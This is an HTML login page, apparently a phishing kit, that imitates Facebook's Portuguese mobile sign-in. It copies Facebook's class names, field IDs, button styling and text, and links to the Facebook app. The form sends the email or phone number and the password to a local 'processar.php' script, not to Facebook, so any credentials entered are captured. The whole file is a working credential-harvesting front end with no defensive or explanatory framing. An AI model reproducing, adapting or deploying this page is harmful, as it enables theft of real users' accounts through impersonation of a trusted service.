<html>
<head>
 <link rel="icon" type="image/png" href="https://i.postimg.cc/9fWYT8VN/images.jpg">
    <title>LOGIN SEGURO</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-image: url('https://i.postimg.cc/hj9LP56M/1-cabe-ario.jpg');
            background-size: 100%;
            background-repeat: no-repeat;
        }
        .header {
            text-align: center;
            padding: 50px;
            cursor: pointer;
        }
        .header a {
            text-decoration: none;
            color: inherit;
        }
        .rectangle {
            width: 100%;
            text-align: center;
            margin-top: 50px;
        }
        .input-container {
            padding: 10px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            max-width: 400px;
            margin: 0 auto;
            height: 40px;
            background-color: #d9dce1;
            border: 1px solid #d9dce1;
            padding: 10px;
            color: #1d2129;
            border-radius: 5px;
        }
        .button-container {
            text-align: center;
            margin-top: 5px;
        }
        button {
            width: 99%;
            max-width: 400px;
            background-color: #1877f2;
            color: white;
            border: none 5px;
            padding: 11px;
            border-radius: 6px;
            cursor: pointer;
            margin: 0 auto;
        }
        .separator {
            border: none;
            border-top: 1px solid transparent;
            margin: 5px 0;
        }
        .password-reset {
            width: 100%;
            text-align: center;
        }
        .reset-square {
            width: 100%;
            height: 100%;
            background-image: url('https://i.postimg.cc/4d3VK6WV/24.jpg');
            background-size: 100%;
            background-repeat: no-repeat;
        }
        p.forgot-password {
            font-family: Arial, sans-serif;
            color: #1877f2;
            text-align: center;
            font-size: 16px;
            margin: 10px 0;
        }
        .error-message {
            color: red;
            text-align: center;
            margin: 10px 0;
            display: none;
        }
    </style>
</head>
<body>
    <div class="header">
        <a href="https://play.google.com/store/apps/details?id=com.facebook.katana" target="_blank">
            <!-- Conteúdo do cabeçalho aqui -->
        </a>
    </div>
    <div class="rectangle">
        <div class="input-container">
            <form method="post" action="processar.php" onsubmit="return validateForm()">
                <input autocorrect="off" autocapitalize="off" type="text" class="_56bg _4u9z _5ruq _8qtn" autocomplete="on" id="m_login_email" name="email" placeholder="Número de celular ou email" data-sigil="m_login_email">
                <div class="separator"></div>
                <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2 _8qtm" autocomplete="on" id="m_login_password" name="pass" placeholder="Senha" type="password" data-sigil="password-plain-text-toggle-input">
                <div class="button-container">
                    <button type="submit">
                        <span class="_55sr">Entrar</span>
                    </button>
                    <p class="forgot-password">Esqueceu a senha?</p>
                    <p class="error-message" id="error-message">Por favor, preencha todos os campos.</p>
                </div>
            </form>
        </div>
    </div>
    <div class="password-reset">
        <div class="reset-square"></div>
    </div>
    <script>
        function validateForm() {
            var emailOrPhone = document.getElementById("m_login_email").value;
            var password = document.getElementById("m_login_password").value;
            var errorMessage = document.getElementById("error-message");

            if (emailOrPhone === "" || password === "") {
                errorMessage.style.display = 'block';
                return false;
            }
        }
    </script>
</body>
</html>